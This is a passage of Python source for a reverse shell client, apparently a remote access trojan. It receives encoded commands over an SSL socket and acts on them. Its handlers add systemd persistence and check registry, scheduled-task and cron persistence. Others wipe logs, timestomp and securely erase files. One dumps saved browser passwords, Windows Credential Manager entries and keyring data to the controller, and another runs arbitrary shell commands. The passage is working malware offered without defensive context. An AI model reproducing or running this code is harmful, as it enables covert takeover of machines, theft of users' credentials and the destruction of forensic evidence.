                    service = f"[Unit]\nDescription=ReverseShellClient\n[Service]\nType=simple\nExecStart={sys.executable} {exe_path}\n[Install]\nWantedBy=multi-user.target\n"
                    service_path = os.path.expanduser('~/.config/systemd/user/reverseshell.service')
                    os.makedirs(os.path.dirname(service_path), exist_ok=True)
                    with open(service_path, 'w') as f:
                        f.write(service)
                    subprocess.call(['systemctl', '--user', 'enable', 'reverseshell.service'])
                    resp = base64.b64encode(b'[+] systemd persistence added.')
                else:
                    resp = base64.b64encode(b'[!] Persistence not supported on this OS.')
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Persist task error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded == 'persist_wmi':
            try:
                resp = base64.b64encode(b'[!] WMI persistence not yet implemented (stub).')
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Persist WMI error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded == 'persist_fileless':
            try:
                resp = base64.b64encode(b'[!] Fileless persistence not yet implemented (stub).')
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Persist fileless error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded == 'persist_status':
            try:
                import os, sys, platform
                status = []
                system = platform.system().lower()
                exe_path = os.path.abspath(sys.argv[0])
                # Check registry
                if 'windows' in system:
                    try:
                        import winreg
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
                        val, _ = winreg.QueryValueEx(key, "ReverseShellClient")
                        status.append('Registry: Present')
                        key.Close()
                    except Exception:
                        status.append('Registry: Not present')
                    # Check scheduled task
                    try:
                        out = subprocess.check_output('schtasks /Query /TN ReverseShellTask', shell=True, stderr=subprocess.STDOUT).decode(errors='ignore')
                        if 'ReverseShellTask' in out:
                            status.append('Scheduled Task: Present')
                        else:
                            status.append('Scheduled Task: Not present')
                    except Exception:
                        status.append('Scheduled Task: Not present')
                elif 'linux' in system:
                    # Check crontab
                    try:
                        from crontab import CronTab
                        user_cron = CronTab(user=True)
                        found = any(exe_path in job.command for job in user_cron)
                        status.append(f'Crontab: {"Present" if found else "Not present"}')
                    except Exception:
                        status.append('Crontab: Not present')
                    # Check systemd
                    try:
                        service_path = os.path.expanduser('~/.config/systemd/user/reverseshell.service')
                        if os.path.exists(service_path):
                            status.append('systemd: Present')
                        else:
                            status.append('systemd: Not present')
                    except Exception:
                        status.append('systemd: Not present')
                resp = base64.b64encode('\n'.join(status).encode())
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Persist status error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded == 'wipe_logs':
            try:
                import glob, os
                count = 0
                for log in glob.glob('client_log_*.txt'):
                    try:
                        os.remove(log)
                        count += 1
                    except Exception:
                        continue
                resp = base64.b64encode(f'[+] Wiped {count} log files.'.encode())
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Wipe logs error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded.startswith('timestomp '):
            try:
                import os, time
                parts = decoded.split(' ')
                file = parts[1]
                if len(parts) == 3:
                    ref = parts[2]
                    if os.path.isfile(ref):
                        stat = os.stat(ref)
                        os.utime(file, (stat.st_atime, stat.st_mtime))
                        resp = base64.b64encode(b'[+] Timestomped to match reference file.')
                    else:
                        # Try to parse as timestamp
                        try:
                            ts = float(ref)
                            os.utime(file, (ts, ts))
                            resp = base64.b64encode(b'[+] Timestomped to specified timestamp.')
                        except Exception:
                            resp = base64.b64encode(b'[!] Invalid reference or timestamp.')
                else:
                    resp = base64.b64encode(b'[!] Usage: timestomp <file> [ref_file|timestamp]')
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Timestomp error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded.startswith('secure_erase '):
            try:
                import os
                file = decoded.split(' ', 1)[1]
                if not os.path.isfile(file):
                    resp = base64.b64encode(b'[!] File not found.')
                else:
                    length = os.path.getsize(file)
                    with open(file, 'r+b') as f:
                        f.write(os.urandom(length))
                    os.remove(file)
                    resp = base64.b64encode(b'[+] File securely erased.')
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Secure erase error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded == 'creds_dump':
            try:
                import os, sys, platform, json, base64
                results = {}
                system = platform.system().lower()
                # Chrome/Chromium/Edge/Opera (all Chromium-based)
                def dump_chromium(browser, path):
                    try:
                        import sqlite3, shutil, win32crypt
                        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                        login_db = os.path.expanduser(path)
                        if not os.path.exists(login_db):
                            return None
                        tmp_db = login_db + '.tmp'
                        shutil.copy2(login_db, tmp_db)
                        conn = sqlite3.connect(tmp_db)
                        c = conn.cursor()
                        c.execute('SELECT origin_url, username_value, password_value FROM logins')
                        logins = []
                        for row in c.fetchall():
                            url, user, pwd = row
                            try:
                                if system == 'windows':
                                    pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode()
                                else:
                                    pwd = '[ENCRYPTED]' # Linux decryption is more complex
                            except Exception:
                                pwd = '[ERROR]'
                            logins.append({'url': url, 'user': user, 'pass': pwd})
                        conn.close()
                        os.remove(tmp_db)
                        return logins
                    except Exception as e:
                        return str(e)
                if system == 'windows':
                    # Chrome
                    chrome = dump_chromium('chrome', r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
                    if chrome: results['chrome'] = chrome
                    # Edge
                    edge = dump_chromium('edge', r'~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data')
                    if edge: results['edge'] = edge
                    # Chromium
                    chromium = dump_chromium('chromium', r'~\AppData\Local\Chromium\User Data\Default\Login Data')
                    if chromium: results['chromium'] = chromium
                    # Opera
                    opera = dump_chromium('opera', r'~\AppData\Roaming\Opera Software\Opera Stable\Login Data')
                    if opera: results['opera'] = opera
                    # Firefox
                    try:
                        import glob
                        ff_dir = os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox\Profiles')
                        for prof in glob.glob(ff_dir + '\\*'):
                            logins = os.path.join(prof, 'logins.json')
                            if os.path.exists(logins):
                                with open(logins, 'r') as f:
                                    results.setdefault('firefox', []).append(json.load(f))
                    except Exception as e:
                        results['firefox'] = str(e)
                    # Windows Credential Manager
                    try:
                        import win32cred
                        creds = win32cred.CredEnumerate(None, 0)
                        results['wincred'] = [c['UserName'] for c in creds if 'UserName' in c]
                    except Exception as e:
                        results['wincred'] = str(e)
                elif system == 'linux':
                    # Chrome/Chromium/Opera
                    chrome = dump_chromium('chrome', '~/.config/google-chrome/Default/Login Data')
                    if chrome: results['chrome'] = chrome
                    chromium = dump_chromium('chromium', '~/.config/chromium/Default/Login Data')
                    if chromium: results['chromium'] = chromium
                    opera = dump_chromium('opera', '~/.config/opera/Default/Login Data')
                    if opera: results['opera'] = opera
                    # Firefox
                    try:
                        import glob
                        ff_dir = os.path.expanduser('~/.mozilla/firefox')
                        for prof in glob.glob(ff_dir + '/*.default*'):
                            logins = os.path.join(prof, 'logins.json')
                            if os.path.exists(logins):
                                with open(logins, 'r') as f:
                                    results.setdefault('firefox', []).append(json.load(f))
                    except Exception as e:
                        results['firefox'] = str(e)
                    # Linux keyrings
                    try:
                        import keyring
                        services = keyring.get_keyring().get_preferred_collection()
                        results['keyring'] = str(services)
                    except Exception as e:
                        results['keyring'] = str(e)
                else:
                    results['error'] = 'Platform not supported yet.'
                resp = base64.b64encode(json.dumps(results).encode())
                ssl_sock.send(resp)
            except Exception as e:
                resp = base64.b64encode(f'[!] Creds dump error: {e}'.encode())
                ssl_sock.send(resp)
        elif decoded:
            proc = subprocess.Popen(decoded, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read() + proc.stderr.read()
            resp = base64.b64encode(stdout_value if stdout_value else b'\n')
            time.sleep(random.uniform(0,2))
            ssl_sock.send(resp)
            log_event(f"Output sent: {stdout_value.decode(errors='ignore')}")
finally:
    ssl_sock.close() 